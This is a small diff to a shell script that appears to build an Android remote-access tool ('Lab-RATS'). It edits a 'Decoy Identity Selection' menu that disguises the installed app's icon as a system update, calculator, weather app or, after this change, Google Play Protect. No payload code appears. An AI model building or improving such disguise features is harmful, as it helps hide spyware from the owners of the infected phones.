@@ -175,7 +175,7 @@ configure_app() {
     echo -e "${CYAN}[*] Decoy Identity Selection${NC}"
     echo -e "${YELLOW}    (The app logo will transform into your selection immediately after install on device)${NC}"
     echo "    1. System Update (Gear)  2. Calculator"
-    echo "    3. Weather               4. Settings"
+    echo "    3. Weather               4. Play Protect"
     echo "    5. Lab-RATS Logo"
     read -p "    Choice (Default 1): " DECOY_CHOICE
     DECOY_CHOICE=${DECOY_CHOICE:-1}
